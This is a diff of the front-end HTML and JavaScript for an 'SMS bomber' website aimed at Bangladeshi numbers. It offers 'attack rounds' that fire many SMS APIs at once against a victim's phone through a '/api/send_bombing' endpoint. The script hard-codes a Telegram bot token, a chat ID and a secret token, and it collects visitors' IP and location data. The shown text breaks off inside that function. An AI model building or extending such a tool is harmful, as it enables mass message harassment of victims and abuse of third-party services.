@@ -22,7 +22,7 @@
   --mono:'Share Tech Mono',monospace;
   --orb:'Orbitron',monospace;
   --raj:'Rajdhani',sans-serif;
-} 
+}
 html{scroll-behavior:smooth}
 body{background:var(--bg);color:var(--g);font-family:var(--mono);min-height:100vh;overflow-x:hidden;cursor:default}
 .cursor-dot{position:fixed;width:6px;height:6px;background:var(--g);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:opacity .2s;box-shadow:0 0 8px var(--g)}
@@ -62,7 +62,6 @@ nav{position:sticky;top:0;z-index:200;height:54px;padding:0 24px;background:rgba
 .hero-glow{position:absolute;top:0;left:50%;transform:translateX(-50%);width:min(600px,90vw);height:200px;background:radial-gradient(ellipse at 50% 0%,rgba(0,255,65,.08) 0%,transparent 70%);pointer-events:none}
 .hbadge{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--ge);background:var(--gc);color:rgba(0,255,65,.65);font-size:9px;letter-spacing:5px;text-transform:uppercase;padding:5px 20px;border-radius:30px;margin-bottom:22px;animation:fup .5s ease both}
 .htitle{font-family:var(--orb);font-size:clamp(26px,6.5vw,60px);font-weight:900;letter-spacing:7px;line-height:1.08;min-height:1.2em;text-shadow:0 0 40px rgba(0,255,65,.4),0 0 80px rgba(0,255,65,.12),0 2px 0 rgba(0,0,0,.5);animation:fup .55s ease .07s both}
-.htitle .dm{color:rgba(0,255,65,.18)}
 .hsub{font-family:var(--raj);font-size:14px;font-weight:500;color:rgba(0,255,65,.3);letter-spacing:5px;text-transform:uppercase;margin-top:10px;min-height:1.5em;animation:fup .55s ease .13s both}
 .hero-stats{display:flex;align-items:center;justify-content:center;gap:28px;margin-top:26px;animation:fup .55s ease .2s both}
 .hstat{text-align:center}
@@ -116,24 +115,12 @@ main{flex:1;max-width:680px;width:100%;margin:0 auto;padding:32px 13px 64px}
 .pfx-g,.pfx-c{color:rgba(0,255,65,.32)}
 .ti{flex:1;background:transparent;border:none;outline:none;color:var(--g);font-family:var(--mono);font-size:14px;caret-color:var(--g);letter-spacing:.5px}
 .ti::placeholder{color:rgba(0,255,65,.15)}
-textarea.ti{resize:none;min-height:90px;line-height:1.7;font-size:13px}
 .ti.cyan-text{color:rgba(190,255,200,.92);caret-color:var(--g)}
 .ti.cyan-text::placeholder{color:rgba(0,255,65,.15)}
-.cbar{display:flex;align-items:center;gap:9px;margin-top:9px}
-.ctk{flex:1;height:2px;background:rgba(0,255,65,.08);border-radius:2px;overflow:hidden;position:relative}
-.cfl{height:100%;width:0%;border-radius:2px;background:var(--cyn);box-shadow:0 0 7px var(--cyn);transition:width .18s,background .3s}
-.cnum{font-size:9px;color:rgba(0,255,65,.24);letter-spacing:1px;flex-shrink:0}
 .field-hint{font-size:9px;color:rgba(0,255,65,.22);letter-spacing:1px;margin-top:7px}
-.conf{background:rgba(0,20,8,.6);border:1px solid rgba(0,255,65,.22);border-radius:9px;padding:14px 16px;margin-top:14px;display:none}
-.conf.show{display:block;animation:fup .3s ease}
-.cr{display:flex;gap:10px;margin-bottom:8px;align-items:flex-start}
-.ck{min-width:90px;letter-spacing:1px;flex-shrink:0;font-size:9px;text-transform:uppercase}
-.ckg,.ckc,.ckp{color:rgba(0,255,65,.35)}
-.cv{color:var(--g);word-break:break-all;font-size:11px}
 .pt{height:3px;background:rgba(0,255,65,.07);border-radius:3px;margin:15px 0;overflow:hidden;display:none;position:relative}
 .pt.show{display:block}
 .pf{height:100%;width:0%;background:linear-gradient(90deg,var(--g2),var(--g));box-shadow:0 0 12px var(--g);transition:width .12s linear;border-radius:3px}
-.pt.show::after{content:'';position:absolute;top:-2px;width:7px;height:7px;border-radius:50%;background:var(--g);box-shadow:0 0 10px var(--g),0 0 20px var(--g);left:var(--dot-pos,0%);transform:translateX(-50%);transition:left .12s linear}
 .sbtn{width:100%;position:relative;overflow:hidden;background:transparent;border:1.5px solid var(--g);color:var(--g);font-family:var(--orb);font-size:11px;font-weight:700;letter-spacing:5px;text-transform:uppercase;padding:18px 20px;border-radius:9px;cursor:pointer;transition:background .3s,box-shadow .3s,border-color .3s,transform .1s}
 .sbtn::before{content:'';position:absolute;top:0;left:-130%;width:60%;height:100%;background:linear-gradient(90deg,transparent,rgba(0,255,65,.22),transparent);animation:shim 2.8s ease-in-out infinite}
 @keyframes shim{0%{left:-130%}40%,100%{left:150%}}
@@ -152,7 +139,6 @@ textarea.ti{resize:none;min-height:90px;line-height:1.7;font-size:13px}
 .res.fail{display:block;background:rgba(60,0,0,.4);border:1px solid rgba(255,51,51,.4);color:var(--red);animation:fup .3s ease}
 @keyframes pop{0%{transform:scale(.96)}60%{transform:scale(1.01)}100%{transform:scale(1)}}
 .rh{font-family:var(--orb);font-size:10px;font-weight:700;letter-spacing:3px;margin-bottom:14px;display:flex;align-items:center;gap:8px}
-.ricon{font-size:16px}
 .rr{display:flex;gap:10px;margin-bottom:7px;align-items:flex-start}
 .rk{opacity:.35;min-width:88px;letter-spacing:1px;flex-shrink:0;font-size:10px;text-transform:uppercase}
 .rv{font-size:11px;word-break:break-all}
@@ -199,17 +185,14 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
 </head>
 <body>
 
-<!-- BOOT SCREEN -->
 <div id="boot">
   <div class="boot-logo flk">SMS BOMBER TOOLS</div>
   <div class="boot-bar-wrap"><div class="boot-bar"></div></div>
   <div class="boot-txt">INITIALIZING SECURE SYSTEM...</div>
 </div>
 
-<!-- CUSTOM CURSOR -->
 <div class="cursor-dot" id="cd"></div>
 <div class="cursor-ring" id="cr"></div>
-
 <canvas id="mc"></canvas>
 <div class="vgn"></div>
 <div class="grid"></div>
@@ -217,20 +200,14 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
 <div class="crn tl"></div><div class="crn tr"></div>
 <div class="crn bl"></div><div class="crn br"></div>
 
-<!-- TOAST -->
 <div class="toast" id="toast">
   <span class="toast-icon" id="toast-icon">✅</span>
-  <span id="toast-msg">SMS sent successfully!</span>
+  <span id="toast-msg">Done!</span>
 </div>
 
 <div class="page">
-
-<!-- NAV -->
 <nav>
-  <div class="nb">
-    <div class="ldot"></div>
-    SMS<span style="color:rgba(0,255,65,.18)">_</span>TOOLS
-  </div>
+  <div class="nb"><div class="ldot"></div>SMS<span style="color:rgba(0,255,65,.18)">_</span>TOOLS</div>
   <div class="nav-mid">
     <div class="nav-stat"><div class="nav-stat-dot"></div>SYSTEM ONLINE</div>
     <div class="nav-stat" style="color:rgba(0,229,255,.3)"><div class="nav-stat-dot" style="background:var(--cyn)"></div>ENCRYPTED</div>
@@ -248,38 +225,24 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
   </div>
 </nav>
 
-<!-- HERO -->
 <header class="hero">
   <div class="hero-glow"></div>
-  <div class="hbadge">
-    <div class="ldot" style="width:5px;height:5px"></div>
-    SECURE MESSAGING INTERFACE — ONLINE
-  </div>
+  <div class="hbadge"><div class="ldot" style="width:5px;height:5px"></div>SECURE MESSAGING INTERFACE — ONLINE</div>
   <h1 class="htitle flk" id="htitle">&nbsp;</h1>
   <p class="hsub" id="hsub">&nbsp;</p>
   <div class="hero-stats">
-    <div class="hstat">
-      <div class="hstat-num" id="sentCount">0</div>
-      <div class="hstat-lbl">SENT TODAY</div>
-    </div>
+    <div class="hstat"><div class="hstat-num" id="sentCount">0</div><div class="hstat-lbl">SENT TODAY</div></div>
     <div class="hstat-div"></div>
-    <div class="hstat">
-      <div class="hstat-num">99%</div>
-      <div class="hstat-lbl">SUCCESS RATE</div>
-    </div>
+    <div class="hstat"><div class="hstat-num">99%</div><div class="hstat-lbl">SUCCESS RATE</div></div>
     <div class="hstat-div"></div>
-    <div class="hstat">
-      <div class="hstat-num">&lt;2s</div>
-      <div class="hstat-lbl">DELIVERY TIME</div>
-    </div>
+    <div class="hstat"><div class="hstat-num">&lt;2s</div><div class="hstat-lbl">DELIVERY TIME</div></div>
   </div>
   <div class="hrule"><span class="hrule-sym">◆</span></div>
 </header>
 
-<!-- STATUS BAR TICKER -->
 <div class="sbar">
   <div class="sbar-ticker">
-    <div class="sbar-inner" id="sbarInner">
+    <div class="sbar-inner">
       <div class="si"><div class="sd"></div>NETWORK ONLINE</div>
       <div class="si"><div class="sd y"></div>AES-256 ENCRYPTED</div>
       <div class="si"><div class="sd c"></div>API CONNECTED</div>
@@ -293,12 +256,11 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
       <div class="si"><div class="sd p"></div>SECURE TUNNEL</div>
       <div class="si"><div class="sd"></div>READY TO SEND</div>
       <div class="si"><div class="sd r"></div>FIREWALL ACTIVE</div>
-      <div class="si" style="border-right:none"><span style="font-family:'Orbitron',monospace;font-size:9px" id="sbt2">--:--:--</span></div>
+      <div class="si" style="border-right:none"><span id="sbt2" style="font-family:'Orbitron',monospace;font-size:9px">--:--:--</span></div>
     </div>
   </div>
 </div>
 
-<!-- MAIN -->
 <main>
 <div class="slbl"><span class="slbl-icon">◈</span> TRANSMISSION CONSOLE</div>
 
@@ -312,12 +274,12 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
   </div>
   <div class="cb">
     <label class="flbl" for="numIn">RECIPIENT PHONE NUMBER</label>
-    <div class="iw ig" id="nwrap">
+    <div class="iw ig">
       <div class="isc"></div>
       <span class="pfx pfx-g">NUMBER ⟹</span>
-      <input class="ti" id="numIn" type="tel" placeholder="01XXXXXXXXX" maxlength="20" autocomplete="off" spellcheck="false" inputmode="tel">
+      <input class="ti" id="numIn" type="tel" placeholder="01XXXXXXXXX" maxlength="20" autocomplete="off" inputmode="tel">
     </div>
-    <div class="field-hint">↳ ENTER BD NUMBER  e.g. 01890183515</div>
+    <div class="field-hint">↳ ENTER BD NUMBER e.g. 01700000000</div>
   </div>
 </div>
 
@@ -327,25 +289,57 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
     <div class="sb sc">02</div>
     <div class="cl clc">Attack Configuration</div>
     <div class="ch-line"></div>
-    <div class="ch-tag">ATTACK INPUT</div>
+    <div class="ch-tag">EXPLOIT-MODULE</div>
   </div>
   <div class="cb">
-    <label class="flbl" for="amountIn">SMS BOMBING</label>
-    <div class="iw ic" id="mwrap" style="align-items:center">
+    <label class="flbl" for="amountIn">ATTACK ROUNDS</label>
+    <div class="iw ic" style="align-items:center">
       <div class="isc"></div>
-      <span class="pfx pfx-c" style="color:var(--g);text-shadow:0 0 8px var(--g);">AMOUNT ⟹</span>
-      <input type="number" class="ti cyan-text" id="amountIn" placeholder="Enter amount (e.g. 100)" style="background:transparent;border:none;outline:none;width:100%;color:var(--g);font-family:'Share Tech Mono';">
-      <input type="hidden" id="msgIn" value="BOMBING_MODE_ACTIVE">
+      <span class="pfx pfx-c" style="color:var(--g);text-shadow:0 0 8px var(--g);">ROUNDS ⟹</span>
+      <input type="number" class="ti cyan-text" id="amountIn" placeholder="e.g. 5  (each round fires all APIs)" style="background:transparent;border:none;outline:none;width:100%;color:var(--g);font-family:'Share Tech Mono';">
     </div>
-    <label class="flbl" style="margin-top:15px;">LIVE ATTACK CONSOLE</label>
-    <div id="terminal" style="height:200px;background:rgba(0,0,0,0.8);border:1px solid var(--g3);overflow-y:auto;padding:10px;font-family:'Share Tech Mono';font-size:0.7rem;color:var(--g2);position:relative;box-shadow:inset 0 0 10px #000;">
-      <div id="logs"><span style="color:#555;">> [SYSTEM] Awaiting target initialization...</span></div>
+    <div class="field-hint" style="margin-bottom:12px;">↳ প্রতি round এ সব APIs একসাথে fire করে। 1 round ≈ 12 SMS</div>
+
+    <!-- TERMINAL HEADER -->
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
+      <label class="flbl" style="margin:0;">▸ LIVE ATTACK TERMINAL</label>
+      <div style="display:flex;gap:12px;font-size:9px;letter-spacing:1px;">
+        <span>SUCCESS: <span id="successCount" style="color:#30d158;font-weight:bold;">0</span></span>
+        <span style="color:rgba(255,51,51,.6);">FAILED: <span id="failCount" style="color:#ff3333;font-weight:bold;">0</span></span>
+        <span style="color:rgba(0,229,255,.4);">TOTAL: <span id="totalCount" style="color:var(--cyn);font-weight:bold;">0</span></span>
+      </div>
     </div>
-    <div class="cbar">
-      <div class="ctk"><div class="cfl" id="cfl" style="width:0%;transition:0.3s;background:linear-gradient(90deg,transparent,var(--g));box-shadow:0 0 10px var(--g);"></div></div>
-      <div class="cnum" style="font-family:'Share Tech Mono';font-size:0.65rem;">
-        <span id="statusText">IDLE</span> | 
-        <span style="color:#777;">Powered by <span style="color:var(--g);font-weight:bold;">TEAM DANGEROUS</span></span>
+
+    <!-- TERMINAL WINDOW -->
+    <div style="background:#000;border:1px solid rgba(0,255,65,.25);border-radius:8px;overflow:hidden;box-shadow:0 0 30px rgba(0,255,65,.05),inset 0 0 40px rgba(0,0,0,.9);">
+      <div style="background:rgba(0,255,65,.06);border-bottom:1px solid rgba(0,255,65,.12);padding:7px 14px;display:flex;align-items:center;gap:7px;">
+        <span style="width:9px;height:9px;border-radius:50%;background:#ff453a;display:inline-block;flex-shrink:0;box-shadow:0 0 5px #ff453a88;"></span>
+        <span style="width:9px;height:9px;border-radius:50%;background:#ffd60a;display:inline-block;flex-shrink:0;box-shadow:0 0 5px #ffd60a88;"></span>
+        <span style="width:9px;height:9px;border-radius:50%;background:#30d158;display:inline-block;flex-shrink:0;box-shadow:0 0 5px #30d15888;"></span>
+        <span style="font-family:'Share Tech Mono';font-size:9px;color:rgba(0,255,65,.3);letter-spacing:3px;margin-left:8px;flex:1;">root@dark-cyber-mind: ~/attack</span>
+        <span style="font-size:9px;color:rgba(0,255,65,.2);letter-spacing:1px;">bash</span>
+      </div>
+      <div style="height:1px;background:linear-gradient(90deg,transparent,rgba(0,255,65,.3),transparent);animation:scanmv 4s linear infinite;position:relative;"></div>
+      <div id="logs" style="height:240px;overflow-y:auto;padding:12px 16px;font-family:'Share Tech Mono';font-size:0.67rem;color:#00cc33;line-height:1.75;scrollbar-width:thin;scrollbar-color:rgba(0,255,65,.2) transparent;">
+        <div style="color:rgba(0,255,65,.2);">╔══════════════════════════════════════════════╗</div>
+        <div style="color:rgba(0,255,65,.2);">║   DARK CYBER MIND — ATTACK ENGINE v3.0      ║</div>
+        <div style="color:rgba(0,255,65,.2);">╚══════════════════════════════════════════════╝</div>
+        <div style="color:#555;margin-top:4px;">[<span style="color:rgba(0,255,65,.35);">SYS</span>] Terminal ready. Enter target &amp; rounds.</div>
+      </div>
+      <div style="border-top:1px solid rgba(0,255,65,.1);background:rgba(0,0,0,.6);padding:5px 14px;display:flex;align-items:center;justify-content:space-between;">
+        <span style="font-size:9px;color:rgba(0,255,65,.25);">STATUS: <span id="statusText" style="color:var(--g);letter-spacing:2px;">IDLE</span></span>
+        <span style="font-size:9px;color:rgba(0,255,65,.15);">BY <span style="color:var(--g);font-weight:bold;">TEAM DANGEROUS</span></span>
+      </div>
+    </div>
+
+    <!-- PROGRESS -->
+    <div style="margin-top:10px;background:rgba(0,0,0,.5);border:1px solid rgba(0,255,65,.12);border-radius:6px;padding:9px 14px;">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;">
+        <span style="font-size:9px;letter-spacing:3px;color:rgba(0,255,65,.3);">INJECTION PROGRESS</span>
+        <span id="progressPct" style="font-family:'Orbitron',monospace;font-size:10px;color:var(--g);">0%</span>
+      </div>
+      <div style="height:3px;background:rgba(0,255,65,.07);border-radius:3px;overflow:hidden;">
+        <div id="cfl" style="height:100%;width:0%;border-radius:3px;background:linear-gradient(90deg,#001a00,#00cc33,#00ff41);box-shadow:0 0 10px rgba(0,255,65,.5);transition:width 0.3s ease;"></div>
       </div>
     </div>
   </div>
@@ -357,23 +351,21 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
     <div class="sb sp">03</div>
     <div class="cl clp">Confirm &amp; Transmit</div>
     <div class="ch-line"></div>
-    <div class="ch-tag">START ATTACK</div>
+    <div class="ch-tag">SEND</div>
   </div>
   <div class="cb">
-    <div class="pt" id="pt"><div class="pf" id="pf"></div></div>
     <button class="sbtn" id="sbtn" onclick="doSend()">
       <div class="bc tl"></div><div class="bc tr"></div>
       <div class="bc bl"></div><div class="bc br"></div>
-      <span class="btxt"> START ATTACK </span>
+      <span class="btxt">START ATTACK</span>
     </button>
     <div class="res" id="res">
       <div class="rh" id="rh"></div>
       <div class="rr"><span class="rk">NUMBER</span><span class="rv" id="rn">—</span></div>
       <div class="rr"><span class="rk">STATUS</span><span class="rv" id="rs">—</span></div>
-      <div class="rr"><span class="rk">RESPONSE</span><span class="rv" id="rp">—</span></div>
       <div class="rr"><span class="rk">TIME</span><span class="rv" id="rt">—</span></div>
       <div class="res-div">
-        <button class="again-btn" onclick="resetForm()">[ START ATTACK ]</button>
+        <button class="again-btn" onclick="resetForm()">[ NEW ATTACK ]</button>
       </div>
     </div>
   </div>
@@ -390,7 +382,6 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
   <div class="cb" style="padding-top:12px;padding-bottom:12px">
     <div class="logbox" id="lb">
       <div class="le info"><span class="let">[BOOT]</span><span class="lem">SMS Terminal v3.0 — Secure Edition</span></div>
-      <div class="le ok"><span class="let">[SYS ]</span><span class="lem">Proxy connection established successfully.</span></div>
       <div class="le ok"><span class="let">[SYS ]</span><span class="lem">AES-256 tunnel active. All systems nominal.</span></div>
       <div class="le info"><span class="let">[SYS ]</span><span class="lem">Awaiting transmission command...</span></div>
     </div>
@@ -398,13 +389,12 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
 </div>
 </main>
 
-<!-- FOOTER -->
 <footer>
   <div class="fi">
     <div class="fg">
       <div>
         <div class="flogo"><div class="ldot" style="width:7px;height:7px"></div>SMS_TERMINAL</div>
-        <p class="fdesc">Professional  SMS BOMBING platform. Fast, encrypted, and reliable messaging built for developers and power users.</p>
+        <p class="fdesc">Professional SMS Bombing platform. Fast, encrypted, reliable.</p>
         <p class="fdesc" style="margin-top:13px;color:rgba(0,255,65,.14)">&copy; 2026 SMS Terminal Pro. All rights reserved.</p>
       </div>
       <div>
@@ -436,355 +426,317 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
     </div>
   </div>
 </footer>
-</div><!-- .page -->
-
-<!-- Popunder Ad -->
-
+</div>
 
 <script>
 // ── CONFIG ──
-const BOT_TOKEN = "8229374272:AAHUZqtxMIQwkKbiOLSD9HOJkrkuqzaHtdk";
-const CHAT_ID   = "5274336938";
-
-// bannedUsers — in-memory (localStorage file:// এ কাজ করে না)
-let bannedUsers = [];
+const BOT_TOKEN    = "8229374272:AAHUZqtxMIQwkKbiOLSD9HOJkrkuqzaHtdk";
+const CHAT_ID      = "5274336938";
+const SECRET_TOKEN = "DCM_DARK_CYBER_2026";
+const API_ENDPOINT = "/api/send_bombing";
+let bannedUsers    = [];
 
 // ── BOOT ──
-setTimeout(() => {
+setTimeout(()=>{
   document.getElementById('boot').classList.add('hide');
-  setTimeout(() => document.getElementById('boot').remove(), 700);
-}, 1000);
+  setTimeout(()=>document.getElementById('boot').remove(),700);
+},1000);
 
 // ── CURSOR ──
 (function(){
-  const dot = document.getElementById('cd'), ring = document.getElementById('cr');
-  let mx=0, my=0, rx=0, ry=0;
-  document.addEventListener('mousemove', e => {
-    mx = e.clientX; my = e.clientY;
-    dot.style.left = mx+'px'; dot.style.top = my+'px';
-  });
-  function animRing(){ rx+=(mx-rx)*.18; ry+=(my-ry)*.18; ring.style.left=rx+'px'; ring.style.top=ry+'px'; requestAnimationFrame(animRing); }
+  const dot=document.getElementById('cd'),ring=document.getElementById('cr');
+  let mx=0,my=0,rx=0,ry=0;
+  document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;dot.style.left=mx+'px';dot.style.top=my+'px';});
+  function animRing(){rx+=(mx-rx)*.18;ry+=(my-ry)*.18;ring.style.left=rx+'px';ring.style.top=ry+'px';requestAnimationFrame(animRing);}
   animRing();
   document.querySelectorAll('button,a,input,textarea').forEach(el=>{
-    el.addEventListener('mouseenter',()=>{ ring.style.transform='translate(-50%,-50%) scale(1.6)'; ring.style.borderColor='rgba(0,255,65,.8)'; });
-    el.addEventListener('mouseleave',()=>{ ring.style.transform='translate(-50%,-50%) scale(1)'; ring.style.borderColor='rgba(0,255,65,.5)'; });
+    el.addEventListener('mouseenter',()=>{ring.style.transform='translate(-50%,-50%) scale(1.6)';ring.style.borderColor='rgba(0,255,65,.8)';});
+    el.addEventListener('mouseleave',()=>{ring.style.transform='translate(-50%,-50%) scale(1)';ring.style.borderColor='rgba(0,255,65,.5)';});
   });
-  if('ontouchstart' in window){ dot.style.display='none'; ring.style.display='none'; }
+  if('ontouchstart' in window){dot.style.display='none';ring.style.display='none';}
 })();
 
 // ── MATRIX ──
 (function(){
-  const c = document.getElementById('mc'), x = c.getContext('2d');
-  const ch = '01アイウエオカキクケコサシスセソタチツテトハヒフヘホ';
-  let cols, drops;
-  function init(){ c.width=innerWidth; c.height=innerHeight; cols=Math.floor(c.width/20); drops=Array(cols).fill(1); }
+  const c=document.getElementById('mc'),x=c.getContext('2d');
+  const ch='01アイウエオカキクケコサシスセソタチツテトハヒフヘホ';
+  let cols,drops;
+  function init(){c.width=innerWidth;c.height=innerHeight;cols=Math.floor(c.width/20);drops=Array(cols).fill(1);}
   function draw(){
-    x.fillStyle='rgba(2,6,2,.07)'; x.fillRect(0,0,c.width,c.height);
-    x.fillStyle='rgba(0,255,65,.2)'; x.font='13px "Share Tech Mono",monospace';
+    x.fillStyle='rgba(2,6,2,.07)';x.fillRect(0,0,c.width,c.height);
+    x.fillStyle='rgba(0,255,65,.2)';x.font='13px "Share Tech Mono",monospace';
     for(let i=0;i<drops.length;i++){
-      x.fillText(ch[Math.floor(Math.random()*ch.length)], i*20, drops[i]*20);
-      if(drops[i]*20>c.height && Math.random()>.975) drops[i]=0;
+      x.fillText(ch[Math.floor(Math.random()*ch.length)],i*20,drops[i]*20);
+      if(drops[i]*20>c.height&&Math.random()>.975)drops[i]=0;
       drops[i]++;
     }
   }
-  init(); setInterval(draw,68);
-  let rt; window.addEventListener('resize',()=>{ clearTimeout(rt); rt=setTimeout(init,200); });
+  init();setInterval(draw,68);
+  let rt;window.addEventListener('resize',()=>{clearTimeout(rt);rt=setTimeout(init,200);});
 })();
 
-// ── TYPING LOOP ──
+// ── TYPING ──
 (function(){
-  const te=document.getElementById('htitle'), se=document.getElementById('hsub');
+  const te=document.getElementById('htitle'),se=document.getElementById('hsub');
   const T=['SMS TERMINAL TOOLS','SMS BOMBER TOOLS','WELCOME TO OUR SMS BOMBER SITE','FOLLOW OUR DARK CYBER MIND PAGE','DARK CYBER SPACE'];
   const S=['Pro v3.0  ·  Secure  ·  BD Edition','Fast  ·  Reliable  ·  Encrypted','Professional  ·  MESSAGE SENDER','Advanced  ·  SMS  ·  Platform','Ultra  ·  Secure  ·  Terminal'];
-  let ti=0, ci=0, ph='t';
+  let ti=0,ci=0,ph='t';
   function go(){
-    if(ph==='t'){ te.textContent=T[ti].slice(0,ci+1); ci++; if(ci===T[ti].length){ ph='s'; ci=0; setTimeout(go,500); return; } setTimeout(go,70+Math.random()*40); }
-    else if(ph==='s'){ se.textContent=S[ti].slice(0,ci+1); ci++; if(ci===S[ti].length){ setTimeout(sd,3200); return; } setTimeout(go,48+Math.random()*28); }
-    else if(ph==='ds'){ se.textContent=S[ti].slice(0,ci); ci--; if(ci<0){ ci=0; ph='dt'; setTimeout(go,90); return; } setTimeout(go,26); }
-    else if(ph==='dt'){ te.textContent=T[ti].slice(0,ci); ci--; if(ci<0){ ti=(ti+1)%T.length; ci=0; ph='t'; setTimeout(go,320); return; } setTimeout(go,34); }
+    if(ph==='t'){te.textContent=T[ti].slice(0,ci+1);ci++;if(ci===T[ti].length){ph='s';ci=0;setTimeout(go,500);return;}setTimeout(go,70+Math.random()*40);}
+    else if(ph==='s'){se.textContent=S[ti].slice(0,ci+1);ci++;if(ci===S[ti].length){setTimeout(sd,3200);return;}setTimeout(go,48+Math.random()*28);}
+    else if(ph==='ds'){se.textContent=S[ti].slice(0,ci);ci--;if(ci<0){ci=0;ph='dt';setTimeout(go,90);return;}setTimeout(go,26);}
+    else if(ph==='dt'){te.textContent=T[ti].slice(0,ci);ci--;if(ci<0){ti=(ti+1)%T.length;ci=0;ph='t';setTimeout(go,320);return;}setTimeout(go,34);}
   }
-  function sd(){ ph='ds'; ci=S[ti].length; go(); }
-  setTimeout(go, 2200);
+  function sd(){ph='ds';ci=S[ti].length;go();}
+  setTimeout(go,2200);
 })();
 
 // ── CLOCK ──
 function tick(){
-  const t = new Date().toLocaleTimeString('en-GB',{hour12:false});
-  ['nc','sbt','sbt2','fc'].forEach(id=>{ const e=document.getElementById(id); if(e) e.textContent=t; });
+  const t=new Date().toLocaleTimeString('en-GB',{hour12:false});
+  ['nc','sbt','sbt2','fc'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent=t;});
 }
-setInterval(tick,1000); tick();
-
-// ── INPUTS ──
-const numIn = document.getElementById('numIn');
-const msgIn = document.getElementById('msgIn');
-numIn.addEventListener('input', upConf);
-function upConf(){
-  const n=numIn.value.trim(), box=document.getElementById('conf');
-  if(!box) return;
-  if(n) box.classList.add('show'); else box.classList.remove('show');
-}
+setInterval(tick,1000);tick();
 
 // ── LOG ──
-function log(msg, type){
-  const box = document.getElementById('lb');
-  const t = new Date().toLocaleTimeString('en-GB',{hour12:false});
-  const el = document.createElement('div');
-  el.className = 'le'+(type?' '+type:'');
-  el.innerHTML = `<span class="let">[${t}]</span><span class="lem">${msg}</span>`;
-  box.appendChild(el); box.scrollTop = box.scrollHeight;
+function log(msg,type){
+  const box=document.getElementById('lb');
+  const t=new Date().toLocaleTimeString('en-GB',{hour12:false});
+  const el=document.createElement('div');
+  el.className='le'+(type?' '+type:'');
+  el.innerHTML=`<span class="let">[${t}]</span><span class="lem">${msg}</span>`;
+  box.appendChild(el);box.scrollTop=box.scrollHeight;
 }
 
 // ── TOAST ──
 let toastTimer;
-function showToast(msg, ok=true){
-  const t = document.getElementById('toast');
-  document.getElementById('toast-icon').textContent = ok ? '✅' : '❌';
-  document.getElementById('toast-msg').textContent = msg;
-  t.className = 'toast'+(ok ? '' : ' fail-toast');
-  requestAnimationFrame(()=>{ t.classList.add('show'); });
+function showToast(msg,ok=true){
+  const t=document.getElementById('toast');
+  document.getElementById('toast-icon').textContent=ok?'✅':'❌';
+  document.getElementById('toast-msg').textContent=msg;
+  t.className='toast'+(ok?'':' fail-toast');
+  requestAnimationFrame(()=>t.classList.add('show'));
   clearTimeout(toastTimer);
-  toastTimer = setTimeout(()=> t.classList.remove('show'), 4000);
+  toastTimer=setTimeout(()=>t.classList.remove('show'),4000);
 }
 
 // ── SHAKE ──
 function shake(el){
-  if(!el) return;
-  el.style.animation = 'shake .38s ease';
-  el.addEventListener('animationend', ()=> el.style.animation='', {once:true});
+  if(!el)return;
+  el.style.animation='shake .38s ease';
+  el.addEventListener('animationend',()=>el.style.animation='',{once:true});
 }
 
 // ── RESET ──
 function resetForm(){
-  document.getElementById('res').className = 'res';
-  const numIn   = document.getElementById('numIn');
-  const amountIn = document.getElementById('amountIn');
-  if(numIn) numIn.value = '';
-  if(amountIn) amountIn.value = '';
-  const f = document.getElementById('cfl');
-  if(f){ f.style.width='0%'; f.style.background='var(--g)'; f.style.boxShadow='0 0 7px var(--ga)'; }
-  const logs = document.getElementById('logs');
-  if(logs) logs.innerHTML = '<div style="color:rgba(0,255,65,.25);">┌──────────────────────────────────────────────┐</div><div style="color:rgba(0,255,65,.25);">│  TEAM DANGEROUS — SECURE INJECTION SYSTEM    │</div><div style="color:rgba(0,255,65,.25);">└──────────────────────────────────────────────┘</div><div style="color:#555;margin-top:4px;">[<span style="color:rgba(0,255,65,.3);">BOOT</span>] Terminal cleared. Awaiting new target...</div>';
-  ['successCount','failCount','totalCount'].forEach(id=>{ const e=document.getElementById(id); if(e) e.textContent='0'; });
-  const progressPct = document.getElementById('progressPct');
-  if(progressPct) progressPct.textContent = '0%';
-  const statusText = document.getElementById('statusText');
-  if(statusText) statusText.innerText = "IDLE";
-  log('Exploit parameters cleared. Ready for new target.', 'warn');
-  if(numIn) numIn.focus();
+  document.getElementById('res').className='res';
+  const n=document.getElementById('numIn'),a=document.getElementById('amountIn');
+  if(n)n.value='';if(a)a.value='';
+  const f=document.getElementById('cfl');
+  if(f){f.style.width='0%';}
+  const logs=document.getElementById('logs');
+  if(logs)logs.innerHTML='<div style="color:rgba(0,255,65,.2);">╔══════════════════════════════════════════════╗</div><div style="color:rgba(0,255,65,.2);">║   DARK CYBER MIND — ATTACK ENGINE v3.0      ║</div><div style="color:rgba(0,255,65,.2);">╚══════════════════════════════════════════════╝</div><div style="color:#555;margin-top:4px;">[<span style="color:rgba(0,255,65,.35);">SYS</span>] Terminal cleared. Awaiting new target...</div>';
+  ['successCount','failCount','totalCount'].forEach(id=>{const e=document.getElementById(id);if(e)e.textContent='0';});
+  const pp=document.getElementById('progressPct');if(pp)pp.textContent='0%';
+  const st=document.getElementById('statusText');if(st)st.textContent='IDLE';
+  log('Terminal cleared. Ready for new target.','warn');
+  if(n)n.focus();
 }
 
-// ── IP DATA (একবারই fetch হবে) ──
-let cachedIPData = null;
+// ── IP / HARDWARE ──
+let cachedIP=null;
 async function getIPData(){
-  if(cachedIPData) return cachedIPData;
-  try {
-    const [ipRes, locRes] = await Promise.all([
-      fetch('https://api.ipify.org?format=json').then(r=>r.json()),
-      fetch('https://ipapi.co/json/').then(r=>r.json())
-    ]);
